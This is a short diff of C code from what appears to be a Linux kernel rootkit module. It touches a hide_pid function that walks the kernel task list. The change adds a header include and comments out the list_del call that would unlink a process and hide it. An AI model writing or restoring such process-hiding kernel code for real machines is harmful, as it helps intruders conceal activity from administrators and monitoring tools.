@@ -4,6 +4,7 @@
 #include <linux/proc_fs.h>
 #include <linux/sched/task.h>
 
+#include "common.h"
 #include "hook.h"
 #include "pidhide.h"
 
@@ -86,7 +87,7 @@ hide_pid(pid_t pid)
     list_for_each_safe(pos, q, &mylist.tasks){
         tmp= list_entry(pos, struct task_struct, tasks);
         if (((struct task_struct *)pos) == ((struct task_struct *)ts)) {
-            list_del(pos);
+            /* list_del(pos); */
             DEBUG_INFO("FOUND\n");
         }
     }
